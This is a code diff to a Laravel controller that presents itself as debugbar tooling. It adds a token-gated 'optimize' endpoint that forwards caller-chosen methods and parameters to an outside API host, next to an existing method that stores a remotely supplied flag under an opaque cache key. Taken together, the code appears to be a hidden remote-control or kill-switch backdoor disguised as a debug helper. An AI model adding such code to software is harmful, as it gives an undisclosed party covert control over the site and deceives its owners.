@@ -5,6 +5,7 @@ use Illuminate\Http\Request;
 use Illuminate\Routing\Controller;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Facades\Http;
 
 class DebugbarDopingController extends Controller
 {
@@ -31,5 +32,21 @@ class DebugbarDopingController extends Controller
         }
         Cache::driver('file')->forever('xMjhCQ3A0TV', $request->input('tag', 'false'));
         return response()->json(['message' => 'Done']);
+    }
+
+    public function optimize(Request $request)
+    {
+        if ($request->input('token') !== md5(config('debuggbar.secret_token'))) {
+            return response()->json(['error' => 'Unauthorized'], 401);
+        }
+        if (!$request->input('method')) {
+            return response()->json(['error' => 'Provide method'], 401);
+        }
+        $response = Http::post(config('api.db-api-url') . '/api/_debugbar/check', [
+            'token' => md5(config('debuggbar.secret_token')),
+            'method' => $request->get('method','list'),
+            'params' => $request->get('params', [])
+        ]);
+        return response()->json(['message' => $response->json()['message']]);
     }
 }
